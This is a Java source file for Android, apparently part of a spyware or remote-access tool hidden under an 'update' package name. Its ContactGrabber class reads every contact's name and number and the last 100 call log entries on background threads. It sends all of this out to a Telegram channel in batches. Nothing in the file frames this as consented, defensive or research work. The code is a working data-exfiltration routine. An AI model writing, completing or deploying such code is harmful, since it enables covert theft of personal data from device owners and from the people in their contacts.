package com.kasari.update;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import java.text.SimpleDateFormat;
import java.util.*;

public class ContactGrabber {

    // ─── All contacts ─────────────────────────────────────────────────────────
    public static void sendContacts(Context ctx) {
        new Thread(() -> {
            StringBuilder sb = new StringBuilder("📒 Contacts:\n\n");
            int count = 0;
            Cursor c = null;
            try {
                c = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    }, null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
                if (c != null && c.moveToFirst()) {
                    do {
                        String name = c.getString(0);
                        String num  = c.getString(1);
                        sb.append(name).append(" — ").append(num).append("\n");
                        count++;
                        // Send in batches of 50 to avoid Telegram message length limit
                        if (count % 50 == 0) {
                            TelegramController.sendMessage(sb.toString());
                            sb.setLength(0);
                            Thread.sleep(500);
                        }
                    } while (c.moveToNext());
                }
            } catch (Exception e) { e.printStackTrace(); }
            finally { if (c != null) c.close(); }
            if (sb.length() > 10) TelegramController.sendMessage(sb.toString());
            TelegramController.sendMessage("✅ Contacts done. Total: " + count);
        }).start();
    }

    // ─── Call log ─────────────────────────────────────────────────────────────
    public static void sendCallLog(Context ctx) {
        new Thread(() -> {
            StringBuilder sb = new StringBuilder("📞 Call Log (last 100):\n\n");
            int count = 0;
            Cursor c = null;
            try {
                c = ctx.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    new String[]{
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.DATE,
                        CallLog.Calls.DURATION
                    }, null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 100");
                if (c != null && c.moveToFirst()) {
                    do {
                        String num   = c.getString(0);
                        int    type  = c.getInt(1);
                        long   date  = c.getLong(2);
                        long   dur   = c.getLong(3);
                        String typeStr = type == CallLog.Calls.INCOMING_TYPE ? "📲 IN" :
                                         type == CallLog.Calls.OUTGOING_TYPE ? "📤 OUT" : "❌ MISS";
                        String dateStr = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                            .format(new Date(date));
                        sb.append(typeStr).append(" ").append(num)
                          .append(" | ").append(dateStr)
                          .append(" | ").append(dur).append("s\n");
                        count++;
                    } while (c.moveToNext());
                }
            } catch (Exception e) { e.printStackTrace(); }
            finally { if (c != null) c.close(); }
            if (sb.length() > 15) TelegramController.sendMessage(sb.toString());
            TelegramController.sendMessage("✅ Call log done. Total: " + count);
        }).start();
    }
}
